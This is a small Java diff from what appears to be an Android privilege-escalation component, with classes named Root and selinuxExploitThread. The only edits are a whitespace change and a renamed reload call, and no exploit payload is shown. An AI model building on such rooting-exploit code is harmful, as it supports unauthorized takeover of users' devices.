@@ -69,7 +69,7 @@ public class Root {
 			ret = !checkSELinuxExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			ret = true;
-		}
+		} 
 
 		if (ret) {
 			if (Cfg.DEBUG) {
@@ -917,7 +917,7 @@ class selinuxExploitThread implements Runnable {
 						}
 						if(PackageInfo.checkRoot()){
 							Status.setRoot(true);
-							Core.self().reloadConf();
+							Core.self().reload();
 						}
 						break;
 					}
